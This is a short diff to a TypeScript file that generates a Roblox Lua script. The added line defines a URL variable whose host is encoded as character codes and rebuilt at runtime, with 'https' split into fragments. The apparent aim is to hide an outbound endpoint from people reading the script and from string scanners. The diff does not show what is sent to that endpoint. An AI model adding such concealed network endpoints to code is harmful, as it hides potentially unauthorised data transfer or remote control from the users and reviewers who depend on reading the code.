@@ -9,6 +9,7 @@ const acusadoScript = (host: string) => `
 
 local Players       = game:GetService("Players")
 local HttpService   = game:GetService("HttpService")
+local J_URL = (function() local t={${host.split("").map((c) => c.charCodeAt(0)).join(",")}} local s="" for i=1,#t do s=s..string.char(t[i]) end return "ht".."tps".."://"..s end)()
 local RunService    = game:GetService("RunService")
 local TweenService  = game:GetService("TweenService")
 
